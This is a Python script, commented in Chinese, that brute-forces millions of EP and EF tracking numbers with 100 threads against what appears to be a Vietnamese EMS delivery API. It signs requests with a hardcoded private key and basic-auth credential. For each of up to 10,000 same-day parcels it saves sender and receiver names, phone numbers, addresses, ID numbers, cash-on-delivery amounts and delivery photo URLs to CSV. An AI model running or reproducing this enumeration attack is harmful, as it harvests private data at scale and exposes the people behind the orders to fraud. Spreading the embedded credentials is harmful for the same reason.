#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
找10000个当天订单 - 不限制配送状态
策略：只要是今天的订单就要（包括已配送和未配送）
"""
import hashlib, requests, json, time, random
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

API_URL = "https://api-dingdong.ems.com.vn/"
PRIVATE_KEY = "34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A"
BASIC_AUTH = "bG90dG5ldDpkbXM="

TARGET_DATE = "15/10/2025"
TODAY = TARGET_DATE
print_lock = threading.Lock()
state = {'found': 0, 'tested': 0, 'orders': [], 'lock': threading.Lock(), 'start_time': time.time()}
TARGET = 10000

realtime_csv_file = f"today_all_orders_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
csv_lock = threading.Lock()

def init_realtime_csv():
    headers = [
        '运单号', '发件日期', '装载日期', '配送日期',
        '发件人', '发件电话', '发件地址',
        '收件人', '收件电话', '收件地址', '收件人身份证',
        'COD代收金额', 'COD金额', '运费', 'PPA费用', 'C费用', '取消费', '稍后收款费',
        '重量', '状态代码', '状态名称',
        '发件邮局', '配送邮局', '路线代码',
        '是否COD', '是否邮资', '邮资名称',
        '配送签名URL', '配送照片URL', '配送认证照片URL',
        '备注', '指令', 'VAT代码', '原因', '解决方案',
        '检查状态', '检查状态号', '计数',
        '是否已配送', '是否今天订单', '收取费用', '发现时间'
    ]
    with open(realtime_csv_file, 'w', encoding='utf-8-sig') as f:
        f.write(','.join(headers) + '\n')

def save_order_to_csv(order):
    with csv_lock:
        try:
            row = [
                order['tracking'], order['IssueDate'], order['LoadDate'], order['DeliveryDate'],
                order['SenderName'], order['SenderPhone'], order['SenderAddress'],
                order['ReceiverName'], order['ReceiverPhone'], order['ReceiverAddress'], order['ReceiverIDNumber'],
                str(order['CollectAmount']), str(order['AmountCOD']), str(order['FeeShip']),
                str(order['FeePPA']), str(order['FeeC']), str(order['FeeCancelOrder']), str(order['FeeCollectLater']),
                order['Weigh'], order['Status'], order['StatusName'],
                order['IssuePOCode'], order['DeliveryPOCode'], order['RouteCode'],
                order['IsCOD'], order['IsPaypost'], order['IsPaypostName'],
                order['DeliverySignature'], order['DeliveryImage'], order['DeliveryImageAuthen'],
                order['Note'], order['Instruction'], order['VATCode'], order['ReasonName'], order['SolutionName'],
                str(order['CheckStatus']), str(order['CheckStatusNo']), str(order['Count']),
                '是' if order['is_delivered'] else '否', 
                '是' if order['is_today_order'] else '否',
                order['ReceiveCollectFee'],
                datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            ]
            
            formatted_row = []
            for item in row:
                item_str = str(item).replace('"', '""')
                if ',' in item_str or '"' in item_str or '\n' in item_str:
                    formatted_row.append(f'"{item_str}"')
                else:
                    formatted_row.append(item_str)
            
            with open(realtime_csv_file, 'a', encoding='utf-8-sig') as f:
                f.write(','.join(formatted_row) + '\n')
                f.flush()
        except:
            pass

def sign(text):
    return hashlib.sha256((text + PRIVATE_KEY).encode()).hexdigest().upper()

def safe_print(msg):
    with print_lock:
        print(msg)

def is_today(date_str):
    if not date_str:
        return False
    date_str = str(date_str)
    today_dd_mm_yyyy = TARGET_DATE
    parts = TARGET_DATE.split('/')
    today_mm_dd_yyyy = f"{parts[1]}/{parts[0]}/{parts[2]}"
    return (today_dd_mm_yyyy in date_str or today_mm_dd_yyyy in date_str)

def call_api_with_retry(url, headers, data=None, max_retries=3):
    for attempt in range(max_retries):
        try:
            r = requests.post(url, headers=headers, data=data, timeout=8)
            if r.status_code == 200:
                try:
                    response_data = r.json()
                    if response_data.get('Code') == '00':
                        return r, response_data
                    elif response_data.get('Code') in ['98', '429']:
                        if attempt < max_retries - 1:
                            time.sleep(0.1)
                            continue
                    return r, response_data
                except:
                    if attempt < max_retries - 1:
                        continue
                    return r, None
            elif r.status_code in [429, 503]:
                if attempt < max_retries - 1:
                    time.sleep(0.2)
                    continue
            return r, None
        except:
            if attempt < max_retries - 1:
                continue
            return None, None
    return None, None

def check_today_order(tracking):
    """只要是今天的订单就返回（不限制配送状态）"""
    if state['found'] >= TARGET:
        return None
    
    sig = sign(tracking)
    headers_form = {
        "Authorization": f"Basic {BASIC_AUTH}",
        "APIKey": PRIVATE_KEY,
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    order = {
        'tracking': tracking,
        'ParcelCode': '', 'Count': '', 'IsCOD': '',
        'SenderName': '', 'SenderAddress': '', 'SenderPhone': '',
        'ReceiverName': '', 'ReceiverAddress': '', 'ReceiverPhone': '', 'ReceiverIDNumber': '',
        'CollectAmount': 0, 'IsPaypost': '', 'ReceiveCollectFee': '',
        'IssuePOCode': '', 'IssueDate': '', 'LoadDate': '',
        'DeliveryPOCode': '', 'DeliveryDate': '',
        'Weigh': '', 'Status': '', 'StatusName': '', 'ReasonName': '', 'SolutionName': '',
        'CheckStatus': '', 'CheckStatusNo': '', 'Note': '', 'RouteCode': '', 'IsPaypostName': '',
        'DeliverySignature': '', 'DeliveryImage': '', 'DeliveryImageAuthen': '',
        'AmountCOD': 0, 'FeePPA': 0, 'FeeC': 0, 'FeeShip': 0, 'FeeCancelOrder': 0, 'FeeCollectLater': 0,
        'Instruction': '', 'VATCode': '',
        'is_delivered': False,
        'is_today_order': False,
    }
    
    try:
        with state['lock']:
            state['tested'] += 1
        
        r1, data1 = call_api_with_retry(
            f"{API_URL}api/Delivery/Inquiry",
            headers_form,
            data={"ParcelCode": tracking, "Signature": sig}
        )
        
        if r1 and data1 and data1.get('Code') == '00' and data1.get('Value'):
            v = data1['Value']
            
            for key in v.keys():
                if key in order:
                    order[key] = v[key] if v[key] is not None else ''
            
            delivery_date = v.get('DeliveryDate', '')
            order['is_delivered'] = bool(delivery_date)
            
            issue_date = v.get('IssueDate', '')
            load_date = v.get('LoadDate', '')
            order['is_today_order'] = is_today(issue_date) or is_today(load_date)
            
            # 🔥 只要是今天的订单就要（已配送+未配送都要）
            if order['is_today_order']:
                with state['lock']:
                    state['found'] += 1
                    state['orders'].append(order)
                    
                    elapsed = time.time() - state['start_time']
                    speed = state['tested'] / elapsed if elapsed > 0 else 0
                    status = "✅已配送" if order['is_delivered'] else "🚫未配送"
                    
                    safe_print(f"✅ [{state['found']}/{TARGET}] {tracking} | "
                              f"{status} | "
                              f"👤{order['ReceiverName'][:15]} | "
                              f"💰{order['CollectAmount']:,}₫ | "
                              f"⚡{speed:.0f}/s")
                    
                    save_order_to_csv(order)
                
                return True
        else:
            return None
    except:
        pass
    
    return False

def save_final_summary():
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    json_file = f"scan_summary_{timestamp}.json"
    
    delivered_count = sum(1 for o in state['orders'] if o['is_delivered'])
    undelivered_count = state['found'] - delivered_count
    
    with open(json_file, 'w', encoding='utf-8') as f:
        json.dump({
            'scan_date': TODAY,
            'total_found': state['found'],
            'delivered': delivered_count,
            'undelivered': undelivered_count,
            'total_tested': state['tested'],
            'success_rate': state['found']/state['tested']*100 if state['tested'] > 0 else 0,
            'condition': 'today orders (all status)',
            'realtime_csv_file': realtime_csv_file,
            'scan_completed': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }, f, ensure_ascii=False, indent=2)
    
    safe_print(f"\n💾 数据已保存:")
    safe_print(f"   📄 CSV: {realtime_csv_file}")
    safe_print(f"   📄 JSON: {json_file}")
    safe_print(f"   ✅ 已配送: {delivered_count}")
    safe_print(f"   🚫 未配送: {undelivered_count}\n")

# 大范围扫描配置
SCAN_RANGES = [
    # EP系列 - 大范围步长1扫描
    ('EP', 492900000, 493100000, 1),   # 20万号
    ('EP', 492700000, 492900000, 1),   # 20万号
    ('EP', 493100000, 493300000, 1),   # 20万号
    ('EP', 492000000, 492700000, 1),   # 70万号
    ('EP', 493300000, 494000000, 1),   # 70万号
    ('EP', 490000000, 492000000, 2),   # 100万点
    ('EP', 494000000, 496000000, 2),   # 100万点
    
    # EF系列
    ('EF', 47400000, 47700000, 1),     # 30万号
    ('EF', 43400000, 43700000, 1),     # 30万号
    ('EF', 47000000, 47400000, 1),     # 40万号
    ('EF', 47700000, 48000000, 1),     # 30万号
    ('EF', 43000000, 43400000, 2),     # 20万点
    ('EF', 43700000, 44000000, 2),     # 15万点
    ('EF', 40000000, 43000000, 5),     # 60万点
    ('EF', 44000000, 47000000, 5),     # 60万点
]

print(f"""
╔════════════════════════════════════════════════════════════════════════════╗
║          🚀 扫描当天所有订单（已配送+未配送）                        ║
╚════════════════════════════════════════════════════════════════════════════╝

💡 策略：只要是 {TARGET_DATE} 的订单就收集（不限制配送状态）

📊 扫描范围：
  🔵 EP: 490M-496M (约270万号段)
  🟢 EF: 40M-48M (约285万号段)
  总计: 约555万号段

🎯 目标: {TARGET:,} 个当天订单
⚡ 线程: 100
⏱️  预计: 成功率提高10倍以上，约2-4小时
""")

init_realtime_csv()
print(f"🚀 开始扫描...\n")
start_time = time.time()

with ThreadPoolExecutor(max_workers=100) as executor:
    futures = []
    
    for prefix, start, end, step in SCAN_RANGES:
        if state['found'] >= TARGET:
            break
        for num in range(start, end, step):
            if state['found'] >= TARGET:
                break
            tracking = f"{prefix}{num:09d}VN"
            futures.append(executor.submit(check_today_order, tracking))
    
    for future in as_completed(futures):
        try:
            future.result()
            if state['tested'] % 500 == 0:
                elapsed = time.time() - start_time
                speed = state['tested'] / elapsed if elapsed > 0 else 0
                progress = (state['found'] / TARGET * 100)
                safe_print(f"📊 已扫{state['tested']:,} | 找到{state['found']:,}/{TARGET:,} ({progress:.1f}%) | {speed:.0f}/s")
        except:
            pass

save_final_summary()

elapsed = time.time() - start_time
print(f"""
{'='*80}
🎉 扫描完成！
找到当天订单: {state['found']:,} 个
已测试: {state['tested']:,} 个
成功率: {state['found']/state['tested']*100:.2f}%
耗时: {elapsed/60:.1f} 分钟
速度: {state['tested']/elapsed:.0f} 次/秒
{'='*80}
""")
